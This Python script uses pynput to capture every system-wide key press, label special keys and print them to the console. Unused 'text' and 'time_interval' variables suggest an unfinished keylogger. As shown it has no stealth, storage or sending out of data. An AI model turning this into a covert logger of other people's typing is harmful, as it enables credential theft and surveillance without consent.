from pynput import keyboard

text = "" # Initialize an empty string to store logged keys
time_interval = 10  # Time interval in seconds
# Define the callback function to handle key presses
def key_to_string(key):
    if hasattr(key, 'char'):
        return key.char  # Letters and numbers
    else:
        # Special keys
        key_map = {
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.enter: "[ENTER]",
            keyboard.Key.space: "[SPACE]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.shift_l: "[LEFT SHIFT]",
            keyboard.Key.shift_r: "[RIGHT SHIFT]",
            keyboard.Key.ctrl: "[CTRL]",
            keyboard.Key.ctrl_l: "[LEFT CTRL]",
            keyboard.Key.ctrl_r: "[RIGHT CTRL]",
            keyboard.Key.alt: "[ALT]",
            keyboard.Key.alt_l: "[LEFT ALT]",
            keyboard.Key.alt_r: "[RIGHT ALT]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.up: "[UP]",
            keyboard.Key.down: "[DOWN]",
            keyboard.Key.left: "[LEFT]",
            keyboard.Key.right: "[RIGHT]",
            keyboard.Key.delete: "[DELETE]",
            keyboard.Key.caps_lock: "[CAPS LOCK]",
            keyboard.Key.cmd: "[COMMAND]",
            keyboard.Key.alt_gr: "[ALT GR]",
            keyboard.Key.print_screen: "[PRINT SCREEN]",
            keyboard.Key.f1: "[F1]",
            keyboard.Key.f2: "[F2]",
            keyboard.Key.f3: "[F3]",
            keyboard.Key.f4: "[F4]",
            keyboard.Key.f5: "[F5]",
            keyboard.Key.f6: "[F6]",
            keyboard.Key.f7: "[F7]",
            keyboard.Key.f8: "[F8]",
            keyboard.Key.f9: "[F9]",
            keyboard.Key.f10: "[F10]",
            keyboard.Key.f11: "[F11]",
            keyboard.Key.f12: "[F12]",
            # Add more special keys as needed
        }
        return key_map.get(key, f"[{key}]") # Not mapped keys

def on_press(key):
    print(key_to_string(key))

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()